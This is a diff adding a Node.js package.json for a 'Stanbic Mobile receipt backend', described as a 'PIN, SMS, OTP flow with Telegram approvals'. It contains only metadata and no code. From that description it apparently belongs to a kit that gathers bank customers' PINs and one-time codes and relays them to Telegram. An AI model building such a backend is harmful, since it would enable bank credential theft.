@@ -1,0 +1,19 @@
+{
+  "name": "stanbic-mobile-receipt-backend",
+  "version": "1.0.0",
+  "description": "Stanbic Mobile receipt backend — PIN, SMS, OTP flow with Telegram approvals",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "dependencies": {
+    "express": "^4.19.2",
+    "cors": "^2.8.5"
+  },
+  "keywords": ["stanbic", "mobile", "receipt", "telegram"],
+  "author": "",
+  "license": "MIT"
+}
